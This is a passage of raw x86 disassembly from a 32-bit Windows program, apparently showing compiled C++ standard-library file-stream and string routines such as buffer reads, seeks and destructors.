  42b52e:	je     0x42b551
  42b530:	mov    eax,DWORD PTR [esi+0x30]
  42b533:	mov    ecx,DWORD PTR [ecx]
  42b535:	mov    edi,DWORD PTR [eax]
  42b537:	add    edi,ecx
  42b539:	cmp    ecx,edi
  42b53b:	jae    0x42b551
  42b53d:	dec    DWORD PTR [eax]
  42b53f:	mov    esi,DWORD PTR [esi+0x20]
  42b542:	mov    eax,DWORD PTR [esi]
  42b544:	lea    ecx,[eax+0x1]
  42b547:	mov    DWORD PTR [esi],ecx
  42b549:	movzx  eax,BYTE PTR [eax]
  42b54c:	jmp    0x42b687
  42b551:	mov    eax,DWORD PTR [esi+0x58]
  42b554:	cmp    eax,edx
  42b556:	jne    0x42b560
  42b558:	or     eax,0xffffffff
  42b55b:	jmp    0x42b687
  42b560:	cmp    DWORD PTR [esi+0x3c],edx
  42b563:	jne    0x42b581
  42b565:	push   eax
  42b566:	lea    eax,[ebp-0x1]
  42b569:	push   eax
  42b56a:	mov    BYTE PTR [ebp-0x1],dl
  42b56d:	call   0x4267bc
  42b572:	test   al,al
  42b574:	pop    ecx
  42b575:	pop    ecx
  42b576:	je     0x42b558
  42b578:	movzx  eax,BYTE PTR [ebp-0x1]
  42b57c:	jmp    0x42b687
  42b581:	mov    eax,DWORD PTR [esi+0x50]
  42b584:	mov    ecx,DWORD PTR [esi+0x48]
  42b587:	push   ebx
  42b588:	push   0xffffffff
  42b58a:	mov    DWORD PTR [esi+0x40],eax
  42b58d:	push   edx
  42b58e:	jmp    0x42b620
  42b593:	mov    ecx,DWORD PTR [esi+0x48]
  42b596:	push   eax
  42b597:	push   0x1
  42b599:	call   0x42ba03
  42b59e:	mov    eax,DWORD PTR [esi+0x48]
  42b5a1:	cmp    DWORD PTR [eax+0x18],0x10
  42b5a5:	jb     0x42b5ac
  42b5a7:	mov    edi,DWORD PTR [eax+0x4]
  42b5aa:	jmp    0x42b5af
  42b5ac:	lea    edi,[eax+0x4]
  42b5af:	cmp    DWORD PTR [eax+0x18],0x10
  42b5b3:	mov    edx,DWORD PTR [eax+0x14]
  42b5b6:	jb     0x42b5bd
  42b5b8:	mov    eax,DWORD PTR [eax+0x4]
  42b5bb:	jmp    0x42b5c0
  42b5bd:	add    eax,0x4
  42b5c0:	mov    ecx,DWORD PTR [esi+0x3c]
  42b5c3:	mov    ebx,DWORD PTR [ecx]
  42b5c5:	mov    DWORD PTR [ebp-0xc],eax
  42b5c8:	lea    eax,[ebp-0x10]
  42b5cb:	push   eax
  42b5cc:	lea    eax,[ebp+0x0]
  42b5cf:	push   eax
  42b5d0:	lea    eax,[ebp-0x1]
  42b5d3:	push   eax
  42b5d4:	lea    eax,[ebp-0x8]
  42b5d7:	push   eax
  42b5d8:	add    edi,edx
  42b5da:	push   edi
  42b5db:	push   DWORD PTR [ebp-0xc]
  42b5de:	lea    eax,[esi+0x50]
  42b5e1:	push   eax
  42b5e2:	call   DWORD PTR [ebx+0x10]
  42b5e5:	sub    eax,0x0
  42b5e8:	je     0x42b650
  42b5ea:	dec    eax
  42b5eb:	je     0x42b607
  42b5ed:	dec    eax
  42b5ee:	dec    eax
  42b5ef:	jne    0x42b637
  42b5f1:	mov    eax,DWORD PTR [esi+0x48]
  42b5f4:	cmp    DWORD PTR [eax+0x14],0x1
  42b5f8:	jb     0x42b625
  42b5fa:	mov    esi,eax
  42b5fc:	cmp    DWORD PTR [esi+0x18],0x10
  42b600:	jb     0x42b63c
  42b602:	mov    esi,DWORD PTR [esi+0x4]
  42b605:	jmp    0x42b63f
  42b607:	mov    ecx,DWORD PTR [esi+0x48]
  42b60a:	cmp    DWORD PTR [ecx+0x18],0x10
  42b60e:	jb     0x42b615
  42b610:	mov    eax,DWORD PTR [ecx+0x4]
  42b613:	jmp    0x42b618
  42b615:	lea    eax,[ecx+0x4]
  42b618:	mov    edx,DWORD PTR [ebp-0x8]
  42b61b:	sub    edx,eax
  42b61d:	push   edx
  42b61e:	push   0x0
  42b620:	call   0x42bb0f
  42b625:	push   DWORD PTR [esi+0x58]
  42b628:	call   0x42e477
  42b62d:	cmp    eax,0xffffffff
  42b630:	pop    ecx
  42b631:	jne    0x42b593
  42b637:	or     eax,0xffffffff
  42b63a:	jmp    0x42b686
  42b63c:	add    esi,0x4
  42b63f:	push   0x1
  42b641:	lea    eax,[ebp-0x1]
  42b644:	push   esi
  42b645:	push   eax
  42b646:	call   0x42da10
  42b64b:	add    esp,0xc
  42b64e:	jmp    0x42b682
  42b650:	mov    eax,DWORD PTR [esi+0x48]
  42b653:	cmp    DWORD PTR [eax+0x18],0x10
  42b657:	jb     0x42b65e
  42b659:	mov    ecx,DWORD PTR [eax+0x4]
  42b65c:	jmp    0x42b661
  42b65e:	lea    ecx,[eax+0x4]
  42b661:	mov    edi,DWORD PTR [eax+0x14]
  42b664:	sub    edi,DWORD PTR [ebp-0x8]
  42b667:	add    edi,ecx
  42b669:	jmp    0x42b67e
  42b66b:	mov    eax,DWORD PTR [ebp-0x8]
  42b66e:	push   DWORD PTR [esi+0x58]
  42b671:	dec    edi
  42b672:	movsx  eax,BYTE PTR [edi+eax*1]
  42b676:	push   eax
  42b677:	call   0x42e257
  42b67c:	pop    ecx
  42b67d:	pop    ecx
  42b67e:	test   edi,edi
  42b680:	jg     0x42b66b
  42b682:	movzx  eax,BYTE PTR [ebp-0x1]
  42b686:	pop    ebx
  42b687:	pop    edi
  42b688:	pop    esi
  42b689:	leave  
  42b68a:	ret    
  42b68b:	push   ebp
  42b68c:	mov    ebp,esp
  42b68e:	push   ecx
  42b68f:	push   ecx
  42b690:	push   ebx
  42b691:	push   esi
  42b692:	mov    esi,ecx
  42b694:	mov    eax,DWORD PTR [esi+0x20]
  42b697:	mov    edx,DWORD PTR [esi+0x30]
  42b69a:	mov    ecx,DWORD PTR [eax]
  42b69c:	mov    edx,DWORD PTR [edx]
  42b69e:	add    edx,ecx
  42b6a0:	xor    ebx,ebx
  42b6a2:	cmp    edx,ecx
  42b6a4:	jbe    0x42b6fd
  42b6a6:	lea    ecx,[esi+0x44]
  42b6a9:	cmp    DWORD PTR [eax],ecx
  42b6ab:	jne    0x42b6fd
  42b6ad:	cmp    DWORD PTR [ebp+0x10],0x1
  42b6b1:	jne    0x42b6fd
  42b6b3:	cmp    DWORD PTR [esi+0x3c],ebx
  42b6b6:	jne    0x42b6bd
  42b6b8:	dec    DWORD PTR [ebp+0xc]
  42b6bb:	jmp    0x42b6fd
  42b6bd:	mov    eax,DWORD PTR [esi+0x48]
  42b6c0:	push   edi
  42b6c1:	mov    edi,DWORD PTR [eax+0x14]
  42b6c4:	jmp    0x42b6e7
  42b6c6:	mov    eax,DWORD PTR [esi+0x48]
  42b6c9:	dec    edi
  42b6ca:	cmp    DWORD PTR [eax+0x18],0x10
  42b6ce:	jb     0x42b6d5
  42b6d0:	mov    eax,DWORD PTR [eax+0x4]
  42b6d3:	jmp    0x42b6d8
  42b6d5:	add    eax,0x4
  42b6d8:	movsx  eax,BYTE PTR [eax+edi*1]
  42b6dc:	push   DWORD PTR [esi+0x58]
  42b6df:	push   eax
  42b6e0:	call   0x42e257
  42b6e5:	pop    ecx
  42b6e6:	pop    ecx
  42b6e7:	cmp    edi,ebx
  42b6e9:	jg     0x42b6c6
  42b6eb:	mov    ecx,DWORD PTR [esi+0x48]
  42b6ee:	push   0xffffffff
  42b6f0:	push   ebx
  42b6f1:	call   0x42bb0f
  42b6f6:	mov    eax,DWORD PTR [esi+0x40]
  42b6f9:	mov    DWORD PTR [esi+0x50],eax
  42b6fc:	pop    edi
  42b6fd:	cmp    DWORD PTR [esi+0x58],ebx
  42b700:	je     0x42b778
  42b702:	mov    ecx,esi
  42b704:	call   0x42bfc7
  42b709:	test   al,al
  42b70b:	je     0x42b778
  42b70d:	cmp    DWORD PTR [ebp+0xc],ebx
  42b710:	jne    0x42b718
  42b712:	cmp    DWORD PTR [ebp+0x10],0x1
  42b716:	je     0x42b72d
  42b718:	push   DWORD PTR [ebp+0x10]
  42b71b:	push   DWORD PTR [ebp+0xc]
  42b71e:	push   DWORD PTR [esi+0x58]
  42b721:	call   0x42e937
  42b726:	add    esp,0xc
  42b729:	test   eax,eax
  42b72b:	jne    0x42b778
  42b72d:	lea    eax,[ebp-0x8]
  42b730:	push   eax
  42b731:	push   DWORD PTR [esi+0x58]
  42b734:	call   0x42e29c
  42b739:	test   eax,eax
  42b73b:	pop    ecx
  42b73c:	pop    ecx
  42b73d:	jne    0x42b778
  42b73f:	mov    ecx,DWORD PTR [esi+0x20]
  42b742:	lea    eax,[esi+0x44]
  42b745:	cmp    DWORD PTR [ecx],eax
  42b747:	jne    0x42b75f
  42b749:	mov    ecx,DWORD PTR [esi+0x10]
  42b74c:	mov    DWORD PTR [ecx],eax
  42b74e:	mov    ecx,DWORD PTR [esi+0x20]
  42b751:	mov    DWORD PTR [ecx],eax
  42b753:	mov    ecx,esi
  42b755:	sub    ecx,eax
  42b757:	mov    eax,DWORD PTR [esi+0x30]
  42b75a:	add    ecx,0x44
  42b75d:	mov    DWORD PTR [eax],ecx
  42b75f:	mov    eax,DWORD PTR [ebp+0x8]
  42b762:	mov    esi,DWORD PTR [esi+0x50]
  42b765:	mov    ecx,DWORD PTR [ebp-0x8]
  42b768:	mov    DWORD PTR [eax+0x8],ecx
  42b76b:	mov    ecx,DWORD PTR [ebp-0x4]
  42b76e:	mov    DWORD PTR [eax],ebx
  42b770:	mov    DWORD PTR [eax+0xc],ecx
  42b773:	mov    DWORD PTR [eax+0x10],esi
  42b776:	jmp    0x42b79e
  42b778:	mov    eax,DWORD PTR [ebp+0x8]
  42b77b:	mov    ecx,DWORD PTR ds:0x439178
  42b781:	mov    DWORD PTR [eax],ecx
  42b783:	mov    ecx,DWORD PTR ds:0x43f840
  42b789:	mov    DWORD PTR [eax+0x8],ecx
  42b78c:	mov    ecx,DWORD PTR ds:0x43f844
  42b792:	mov    DWORD PTR [eax+0xc],ecx
  42b795:	mov    ecx,DWORD PTR ds:0x464ea4
  42b79b:	mov    DWORD PTR [eax+0x10],ecx
  42b79e:	pop    esi
  42b79f:	pop    ebx
  42b7a0:	leave  
  42b7a1:	ret    0x10
  42b7a4:	push   ebp
  42b7a5:	mov    ebp,esp
  42b7a7:	push   ecx
  42b7a8:	push   ecx
  42b7a9:	mov    eax,DWORD PTR [ebp+0x14]
  42b7ac:	push   esi
  42b7ad:	mov    esi,ecx
  42b7af:	cmp    DWORD PTR [esi+0x58],0x0
  42b7b3:	mov    DWORD PTR [ebp-0x8],eax
  42b7b6:	mov    eax,DWORD PTR [ebp+0x18]
  42b7b9:	mov    DWORD PTR [ebp-0x4],eax
  42b7bc:	je     0x42b85c
  42b7c2:	call   0x42bfc7
  42b7c7:	test   al,al
  42b7c9:	je     0x42b85c
  42b7cf:	lea    eax,[ebp-0x8]
  42b7d2:	push   eax
  42b7d3:	push   DWORD PTR [esi+0x58]
  42b7d6:	call   0x42e4c7
  42b7db:	test   eax,eax
  42b7dd:	pop    ecx
  42b7de:	pop    ecx
  42b7df:	jne    0x42b85c
  42b7e1:	cmp    DWORD PTR [ebp+0xc],eax
  42b7e4:	je     0x42b7fa
  42b7e6:	push   0x1
  42b7e8:	push   DWORD PTR [ebp+0xc]
  42b7eb:	push   DWORD PTR [esi+0x58]
  42b7ee:	call   0x42e937
  42b7f3:	add    esp,0xc
  42b7f6:	test   eax,eax
  42b7f8:	jne    0x42b85c
  42b7fa:	lea    eax,[ebp-0x8]
  42b7fd:	push   eax
  42b7fe:	push   DWORD PTR [esi+0x58]
  42b801:	call   0x42e29c
  42b806:	test   eax,eax
  42b808:	pop    ecx
  42b809:	pop    ecx
  42b80a:	jne    0x42b85c
  42b80c:	mov    ecx,DWORD PTR [esi+0x48]
  42b80f:	test   ecx,ecx
  42b811:	je     0x42b822
  42b813:	mov    eax,DWORD PTR [ebp+0x1c]
  42b816:	push   0xffffffff
  42b818:	push   0x0
  42b81a:	mov    DWORD PTR [esi+0x50],eax
  42b81d:	call   0x42bb0f
  42b822:	mov    ecx,DWORD PTR [esi+0x20]
  42b825:	lea    eax,[esi+0x44]
  42b828:	cmp    DWORD PTR [ecx],eax
  42b82a:	jne    0x42b842
  42b82c:	mov    ecx,DWORD PTR [esi+0x10]
  42b82f:	mov    DWORD PTR [ecx],eax
  42b831:	mov    ecx,DWORD PTR [esi+0x20]
  42b834:	mov    DWORD PTR [ecx],eax
  42b836:	mov    ecx,esi
  42b838:	sub    ecx,eax
  42b83a:	mov    eax,DWORD PTR [esi+0x30]
  42b83d:	add    ecx,0x44
  42b840:	mov    DWORD PTR [eax],ecx
  42b842:	mov    eax,DWORD PTR [ebp+0x8]
  42b845:	mov    esi,DWORD PTR [esi+0x50]
  42b848:	mov    ecx,DWORD PTR [ebp-0x8]
  42b84b:	and    DWORD PTR [eax],0x0
  42b84e:	mov    DWORD PTR [eax+0x8],ecx
  42b851:	mov    ecx,DWORD PTR [ebp-0x4]
  42b854:	mov    DWORD PTR [eax+0xc],ecx
  42b857:	mov    DWORD PTR [eax+0x10],esi
  42b85a:	jmp    0x42b882
  42b85c:	mov    eax,DWORD PTR [ebp+0x8]
  42b85f:	mov    ecx,DWORD PTR ds:0x439178
  42b865:	mov    DWORD PTR [eax],ecx
  42b867:	mov    ecx,DWORD PTR ds:0x43f840
  42b86d:	mov    DWORD PTR [eax+0x8],ecx
  42b870:	mov    ecx,DWORD PTR ds:0x43f844
  42b876:	mov    DWORD PTR [eax+0xc],ecx
  42b879:	mov    ecx,DWORD PTR ds:0x464ea4
  42b87f:	mov    DWORD PTR [eax+0x10],ecx
  42b882:	pop    esi
  42b883:	leave  
  42b884:	ret    0x20
  42b887:	push   esi
  42b888:	mov    esi,ecx
  42b88a:	mov    eax,DWORD PTR [esi+0x58]
  42b88d:	test   eax,eax
  42b88f:	je     0x42b8c0
  42b891:	cmp    DWORD PTR [esp+0x8],0x0
  42b896:	jne    0x42b8a4
  42b898:	cmp    DWORD PTR [esp+0xc],0x0
  42b89d:	jne    0x42b8a4
  42b89f:	push   0x4
  42b8a1:	pop    ecx
  42b8a2:	jmp    0x42b8a6
  42b8a4:	xor    ecx,ecx
  42b8a6:	push   DWORD PTR [esp+0xc]
  42b8aa:	push   ecx
  42b8ab:	push   DWORD PTR [esp+0x10]
  42b8af:	push   eax
  42b8b0:	call   0x42e540
  42b8b5:	add    esp,0x10
  42b8b8:	test   eax,eax
  42b8ba:	jne    0x42b8c0
  42b8bc:	mov    eax,esi
  42b8be:	jmp    0x42b8c2
  42b8c0:	xor    eax,eax
  42b8c2:	pop    esi
  42b8c3:	ret    0x8
  42b8c6:	push   esi
  42b8c7:	mov    esi,ecx
  42b8c9:	cmp    DWORD PTR [esi+0x58],0x0
  42b8cd:	je     0x42b8ed
  42b8cf:	mov    eax,DWORD PTR [esi]
  42b8d1:	push   0xffffffff
  42b8d3:	call   DWORD PTR [eax+0x4]
  42b8d6:	cmp    eax,0xffffffff
  42b8d9:	je     0x42b8ed
  42b8db:	push   DWORD PTR [esi+0x58]
  42b8de:	call   0x42e41e
  42b8e3:	test   eax,eax
  42b8e5:	pop    ecx
  42b8e6:	jge    0x42b8ed
  42b8e8:	or     eax,0xffffffff
  42b8eb:	pop    esi
  42b8ec:	ret    
  42b8ed:	xor    eax,eax
  42b8ef:	pop    esi
  42b8f0:	ret    
  42b8f1:	push   esi
  42b8f2:	push   DWORD PTR [esp+0x8]
  42b8f6:	mov    esi,ecx
  42b8f8:	call   0x42c86d
  42b8fd:	pop    ecx
  42b8fe:	push   eax
  42b8ff:	mov    ecx,esi
  42b901:	call   0x42c095
  42b906:	pop    esi
  42b907:	ret    0x4
  42b90a:	push   esi
  42b90b:	mov    esi,ecx
  42b90d:	mov    DWORD PTR [esi],0x4391f8
  42b913:	call   0x42cb7b
  42b918:	test   BYTE PTR [esp+0x8],0x1
  42b91d:	je     0x42b926
  42b91f:	push   esi
  42b920:	call   0x42e750
  42b925:	pop    ecx
  42b926:	mov    eax,esi
  42b928:	pop    esi
  42b929:	ret    0x4
  42b92c:	push   esi
  42b92d:	lea    esi,[ecx-0x8]
  42b930:	mov    ecx,esi
  42b932:	call   0x42b9c2
  42b937:	test   BYTE PTR [esp+0x8],0x1
  42b93c:	je     0x42b945
  42b93e:	push   esi
  42b93f:	call   0x42e750
  42b944:	pop    ecx
  42b945:	mov    eax,esi
  42b947:	pop    esi
  42b948:	ret    0x4
  42b94b:	push   esi
  42b94c:	mov    esi,ecx
  42b94e:	call   0x42b021
  42b953:	test   BYTE PTR [esp+0x8],0x1
  42b958:	je     0x42b961
  42b95a:	push   esi
  42b95b:	call   0x42e750
  42b960:	pop    ecx
  42b961:	mov    eax,esi
  42b963:	pop    esi
  42b964:	ret    0x4
  42b967:	push   esi
  42b968:	lea    esi,[ecx-0x64]
  42b96b:	mov    eax,esi
  42b96d:	call   0x4269ad
  42b972:	test   BYTE PTR [esp+0x8],0x1
  42b977:	je     0x42b980
  42b979:	push   esi
  42b97a:	call   0x42e750
  42b97f:	pop    ecx
  42b980:	mov    eax,esi
  42b982:	pop    esi
  42b983:	ret    0x4
  42b986:	push   esi
  42b987:	mov    esi,ecx
  42b989:	call   0x42b2c3
  42b98e:	test   BYTE PTR [esp+0x8],0x1
  42b993:	je     0x42b99c
  42b995:	push   esi
  42b996:	call   0x42e750
  42b99b:	pop    ecx
  42b99c:	mov    eax,esi
  42b99e:	pop    esi
  42b99f:	ret    0x4
  42b9a2:	push   esi
  42b9a3:	push   0x0
  42b9a5:	push   0x1
  42b9a7:	mov    esi,ecx
  42b9a9:	call   0x42bb7b
  42b9ae:	test   BYTE PTR [esp+0x8],0x1
  42b9b3:	je     0x42b9bc
  42b9b5:	push   esi
  42b9b6:	call   0x42e750
  42b9bb:	pop    ecx
  42b9bc:	mov    eax,esi
  42b9be:	pop    esi
  42b9bf:	ret    0x4
  42b9c2:	mov    eax,DWORD PTR [ecx]
  42b9c4:	mov    eax,DWORD PTR [eax+0x4]
  42b9c7:	add    ecx,0x8
  42b9ca:	mov    DWORD PTR [eax+ecx*1-0x8],0x4392c4
  42b9d2:	mov    DWORD PTR [ecx],0x4391f8
  42b9d8:	jmp    0x42cb7b
  42b9dd:	push   esi
  42b9de:	mov    esi,ecx
  42b9e0:	push   0x0
  42b9e2:	mov    DWORD PTR [esi+0x18],0xf
  42b9e9:	call   0x42c231
  42b9ee:	push   DWORD PTR [esp+0xc]
  42b9f2:	mov    ecx,esi
  42b9f4:	push   DWORD PTR [esp+0xc]
  42b9f8:	call   0x42c1e6
  42b9fd:	mov    eax,esi
  42b9ff:	pop    esi
  42ba00:	ret    0x8
  42ba03:	push   ebx
  42ba04:	mov    ebx,DWORD PTR [esp+0x8]
  42ba08:	push   esi
  42ba09:	or     eax,0xffffffff
  42ba0c:	mov    esi,ecx
  42ba0e:	sub    eax,DWORD PTR [esi+0x14]
  42ba11:	cmp    eax,ebx
  42ba13:	ja     0x42ba1a
  42ba15:	call   0x42d3af
  42ba1a:	test   ebx,ebx
  42ba1c:	jbe    0x42ba5c
  42ba1e:	push   edi
  42ba1f:	mov    edi,DWORD PTR [esi+0x14]
  42ba22:	push   0x0
  42ba24:	add    edi,ebx
  42ba26:	push   edi
  42ba27:	mov    ecx,esi
  42ba29:	call   0x42c24d
  42ba2e:	test   al,al
  42ba30:	je     0x42ba5b
  42ba32:	cmp    DWORD PTR [esi+0x18],0x10
  42ba36:	jb     0x42ba3d
  42ba38:	mov    eax,DWORD PTR [esi+0x4]
  42ba3b:	jmp    0x42ba40
  42ba3d:	lea    eax,[esi+0x4]
  42ba40:	push   DWORD PTR [esp+0x14]
  42ba44:	mov    ecx,DWORD PTR [esi+0x14]
  42ba47:	add    ecx,eax
  42ba49:	push   ebx
  42ba4a:	push   ecx
  42ba4b:	call   0x401000
  42ba50:	add    esp,0xc
  42ba53:	push   edi
  42ba54:	mov    ecx,esi
  42ba56:	call   0x42c231
  42ba5b:	pop    edi
  42ba5c:	mov    eax,esi
  42ba5e:	pop    esi
  42ba5f:	pop    ebx
  42ba60:	ret    0x8
  42ba63:	push   ebp
  42ba64:	mov    ebp,esp
  42ba66:	mov    eax,DWORD PTR [ebp+0xc]
  42ba69:	push   ebx
  42ba6a:	push   esi
  42ba6b:	push   edi
  42ba6c:	mov    edi,DWORD PTR [ebp+0x8]
  42ba6f:	cmp    DWORD PTR [edi+0x14],eax
  42ba72:	mov    ebx,ecx
  42ba74:	jae    0x42ba7b
  42ba76:	call   0x42d36f
  42ba7b:	mov    esi,DWORD PTR [edi+0x14]
  42ba7e:	mov    eax,DWORD PTR [ebp+0xc]
  42ba81:	sub    esi,eax
  42ba83:	cmp    DWORD PTR [ebp+0x10],esi
  42ba86:	jae    0x42ba8b
  42ba88:	mov    esi,DWORD PTR [ebp+0x10]
  42ba8b:	cmp    ebx,edi
  42ba8d:	mov    ecx,ebx
  42ba8f:	jne    0x42baa9
  42ba91:	push   0xffffffff
  42ba93:	add    esi,eax
  42ba95:	push   esi
  42ba96:	call   0x42bb0f
  42ba9b:	push   DWORD PTR [ebp+0xc]
  42ba9e:	mov    ecx,ebx
  42baa0:	push   0x0
  42baa2:	call   0x42bb0f
  42baa7:	jmp    0x42bae9
  42baa9:	push   0x0
  42baab:	push   esi
  42baac:	call   0x42c24d
  42bab1:	test   al,al
  42bab3:	je     0x42bae9
  42bab5:	cmp    DWORD PTR [edi+0x18],0x10
  42bab9:	jb     0x42bac0
  42babb:	mov    edi,DWORD PTR [edi+0x4]
  42babe:	jmp    0x42bac3
  42bac0:	add    edi,0x4
  42bac3:	cmp    DWORD PTR [ebx+0x18],0x10
  42bac7:	jb     0x42bace
  42bac9:	mov    eax,DWORD PTR [ebx+0x4]
  42bacc:	jmp    0x42bad1
  42bace:	lea    eax,[ebx+0x4]
  42bad1:	mov    ecx,DWORD PTR [ebp+0xc]
  42bad4:	push   esi
  42bad5:	add    edi,ecx
  42bad7:	push   edi
  42bad8:	push   eax
  42bad9:	call   0x42da10
  42bade:	add    esp,0xc
  42bae1:	push   esi
  42bae2:	mov    ecx,ebx
  42bae4:	call   0x42c231
  42bae9:	pop    edi
  42baea:	pop    esi
  42baeb:	mov    eax,ebx
  42baed:	pop    ebx
  42baee:	pop    ebp
  42baef:	ret    0xc
  42baf2:	push   esi
  42baf3:	push   DWORD PTR [esp+0x8]
  42baf7:	mov    esi,ecx
  42baf9:	call   0x42e160
  42bafe:	pop    ecx
  42baff:	push   eax
  42bb00:	push   DWORD PTR [esp+0xc]
  42bb04:	mov    ecx,esi
  42bb06:	call   0x42c177
  42bb0b:	pop    esi
  42bb0c:	ret    0x4
  42bb0f:	push   ebp
  42bb10:	mov    ebp,esp
  42bb12:	push   esi
  42bb13:	push   edi
  42bb14:	mov    edi,DWORD PTR [ebp+0x8]
  42bb17:	mov    esi,ecx
  42bb19:	cmp    DWORD PTR [esi+0x14],edi
  42bb1c:	jae    0x42bb23
  42bb1e:	call   0x42d36f
  42bb23:	mov    eax,DWORD PTR [esi+0x14]
  42bb26:	sub    eax,edi
  42bb28:	cmp    eax,DWORD PTR [ebp+0xc]
  42bb2b:	jae    0x42bb30
  42bb2d:	mov    DWORD PTR [ebp+0xc],eax
  42bb30:	cmp    DWORD PTR [ebp+0xc],0x0
  42bb34:	jbe    0x42bb73
  42bb36:	push   ebx
  42bb37:	mov    ebx,DWORD PTR [esi+0x18]
  42bb3a:	cmp    ebx,0x10
  42bb3d:	lea    ecx,[esi+0x4]
  42bb40:	jb     0x42bb46
  42bb42:	mov    edx,DWORD PTR [ecx]
  42bb44:	jmp    0x42bb48
  42bb46:	mov    edx,ecx
  42bb48:	cmp    ebx,0x10
  42bb4b:	pop    ebx
  42bb4c:	jb     0x42bb50
  42bb4e:	mov    ecx,DWORD PTR [ecx]
  42bb50:	sub    eax,DWORD PTR [ebp+0xc]
  42bb53:	add    edx,edi
  42bb55:	add    edx,DWORD PTR [ebp+0xc]
  42bb58:	push   eax
  42bb59:	push   edx
  42bb5a:	add    ecx,edi
  42bb5c:	push   ecx
  42bb5d:	call   0x42ddb0
  42bb62:	mov    eax,DWORD PTR [esi+0x14]
  42bb65:	sub    eax,DWORD PTR [ebp+0xc]
  42bb68:	add    esp,0xc
  42bb6b:	push   eax
  42bb6c:	mov    ecx,esi
  42bb6e:	call   0x42c231
  42bb73:	pop    edi
  42bb74:	mov    eax,esi
  42bb76:	pop    esi
  42bb77:	pop    ebp
  42bb78:	ret    0x8
  42bb7b:	cmp    BYTE PTR [esp+0x4],0x0
  42bb80:	push   esi
  42bb81:	mov    esi,ecx
  42bb83:	je     0x42bbae
  42bb85:	cmp    DWORD PTR [esi+0x18],0x10
  42bb89:	jb     0x42bbae
  42bb8b:	cmp    DWORD PTR [esp+0xc],0x0
  42bb90:	lea    eax,[esi+0x4]
  42bb93:	push   edi
  42bb94:	mov    edi,DWORD PTR [eax]
  42bb96:	jbe    0x42bba6
  42bb98:	push   DWORD PTR [esp+0x10]
  42bb9c:	push   edi
  42bb9d:	push   eax
  42bb9e:	call   0x42da10
  42bba3:	add    esp,0xc
  42bba6:	push   edi
  42bba7:	call   0x42e750
  42bbac:	pop    ecx
  42bbad:	pop    edi
  42bbae:	push   DWORD PTR [esp+0xc]
  42bbb2:	mov    ecx,esi
  42bbb4:	mov    DWORD PTR [esi+0x18],0xf
  42bbbb:	call   0x42c231
  42bbc0:	pop    esi
  42bbc1:	ret    0x8
  42bbc4:	cmp    DWORD PTR [ecx+0x28],0x0
  42bbc8:	mov    eax,DWORD PTR [esp+0x4]
  42bbcc:	jne    0x42bbd1
  42bbce:	or     eax,0x4
  42bbd1:	push   DWORD PTR [esp+0x8]
  42bbd5:	push   eax
  42bbd6:	call   0x42cc57
  42bbdb:	ret    0x8
  42bbde:	push   ebp
  42bbdf:	mov    ebp,esp
  42bbe1:	push   ecx
  42bbe2:	mov    eax,DWORD PTR [ecx+0x24]
  42bbe5:	mov    ecx,DWORD PTR [eax]
  42bbe7:	push   esi
  42bbe8:	mov    DWORD PTR [ebp-0x4],ecx
  42bbeb:	call   0x401130
  42bbf0:	lea    eax,[ebp-0x4]
  42bbf3:	push   eax
  42bbf4:	call   0x42c529
  42bbf9:	pop    ecx
  42bbfa:	lea    ecx,[ebp-0x4]
  42bbfd:	mov    esi,eax
  42bbff:	call   0x40119a
  42bc04:	push   DWORD PTR [ebp+0x8]
  42bc07:	mov    eax,DWORD PTR [esi]
  42bc09:	mov    ecx,esi
  42bc0b:	call   DWORD PTR [eax+0x18]
  42bc0e:	pop    esi
  42bc0f:	leave  
  42bc10:	ret    0x4
  42bc13:	push   ebp
  42bc14:	mov    ebp,esp
  42bc16:	push   ecx
  42bc17:	xor    eax,eax
  42bc19:	cmp    DWORD PTR [ebp+0x14],eax
  42bc1c:	push   esi
  42bc1d:	mov    esi,ecx
  42bc1f:	mov    DWORD PTR [ebp-0x4],eax
  42bc22:	je     0x42bc31
  42bc24:	mov    DWORD PTR [esi],0x43b4c8
  42bc2a:	mov    DWORD PTR [esi+0x8],0x4391f8
  42bc31:	cmp    BYTE PTR [ebp+0x10],al
  42bc34:	mov    ecx,DWORD PTR [esi]
  42bc36:	mov    ecx,DWORD PTR [ecx+0x4]
  42bc39:	mov    DWORD PTR [esi+ecx*1],0x4392c4
  42bc40:	mov    DWORD PTR [esi+0x4],eax
  42bc43:	jne    0x42bc57
  42bc45:	push   DWORD PTR [ebp+0xc]
  42bc48:	mov    eax,DWORD PTR [esi]
  42bc4a:	mov    ecx,DWORD PTR [eax+0x4]
  42bc4d:	push   DWORD PTR [ebp+0x8]
  42bc50:	add    ecx,esi
  42bc52:	call   0x42c2c1
  42bc57:	mov    eax,esi
  42bc59:	pop    esi
  42bc5a:	leave  
  42bc5b:	ret    0x10
  42bc5e:	mov    eax,0x438072
  42bc63:	call   0x42f168
  42bc68:	sub    esp,0x20
  42bc6b:	push   ebx
  42bc6c:	push   esi
  42bc6d:	push   edi
  42bc6e:	mov    DWORD PTR [ebp-0x10],esp
  42bc71:	mov    edi,DWORD PTR [ebp+0x8]
  42bc74:	mov    eax,DWORD PTR [edi]
  42bc76:	mov    eax,DWORD PTR [eax+0x4]
  42bc79:	lea    ecx,[eax+edi*1]
  42bc7c:	mov    eax,DWORD PTR [ecx+0x8]
  42bc7f:	xor    ebx,ebx
  42bc81:	cmp    eax,ebx
  42bc83:	jne    0x42bd6e
  42bc89:	mov    ecx,DWORD PTR [ecx+0x2c]
  42bc8c:	cmp    ecx,ebx
  42bc8e:	je     0x42bc97
  42bc90:	mov    esi,ecx
  42bc92:	call   0x42aecb
  42bc97:	cmp    BYTE PTR [ebp+0xc],bl
  42bc9a:	jne    0x42bd59
  42bca0:	mov    eax,DWORD PTR [edi]
  42bca2:	mov    ecx,DWORD PTR [eax+0x4]
  42bca5:	mov    ecx,DWORD PTR [ecx+edi*1+0x10]
  42bca9:	test   cl,0x1
  42bcac:	je     0x42bd59
  42bcb2:	mov    eax,DWORD PTR [eax+0x4]
  42bcb5:	add    eax,edi
  42bcb7:	mov    eax,DWORD PTR [eax+0x24]
  42bcba:	mov    eax,DWORD PTR [eax]
  42bcbc:	mov    DWORD PTR [ebp-0x14],eax
  42bcbf:	mov    ecx,eax
  42bcc1:	call   0x401130
  42bcc6:	lea    eax,[ebp-0x14]
  42bcc9:	push   eax
  42bcca:	call   0x42c529
  42bccf:	pop    ecx
  42bcd0:	mov    esi,eax
  42bcd2:	lea    ecx,[ebp-0x14]
  42bcd5:	call   0x40119a
  42bcda:	mov    DWORD PTR [ebp-0x4],ebx
  42bcdd:	mov    eax,DWORD PTR [edi]
  42bcdf:	mov    eax,DWORD PTR [eax+0x4]
